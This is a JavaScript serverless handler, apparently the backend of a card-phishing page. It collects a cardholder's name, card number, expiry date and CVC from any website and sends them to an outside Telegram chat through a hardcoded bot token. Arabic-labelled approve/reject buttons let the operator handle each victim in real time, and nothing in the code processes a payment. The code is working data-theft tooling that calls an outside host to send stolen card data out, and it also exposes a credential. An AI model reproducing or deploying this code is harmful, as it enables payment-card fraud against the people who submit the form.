export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  const BOT_TOKEN = "9216807620:AAGDIyVqXUaLmN_MdiMyAxAzRY0S6KCqEGw";
  const CHAT_ID = "8278749797";
  const body = req.body || {};

  const userId = body.user_id || Date.now().toString();

  const text = `💳 *طلب بطاقة دفع جديدة (فيزا)*\n\n` +
               `👤 اسم الحامل: ${body.card_name || body.cardName || 'غير محدد'}\n` +
               `💳 رقم البطاقة: \`${body.card_number || body.cardNumber || ''}\`\n` +
               `📅 الانتهاء: ${body.exp_date || body.expDate || ''}\n` +
               `🔒 CVC / Check ID: \`${body.cvc || body.check_id || ''}\`\n` +
               `🆔 معرف المستخدم: \`${userId}\``;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_pay_${userId}` },
        { text: "❌ رفض", callback_data: `reject_pay_${userId}` }
      ]
    ]
  };

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });

    const tgResult = await tgRes.json();
    if (!tgResult.ok) {
      return res.status(500).json({ error: tgResult.description });
    }

    return res.status(200).json({ ok: true, user_id: userId });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
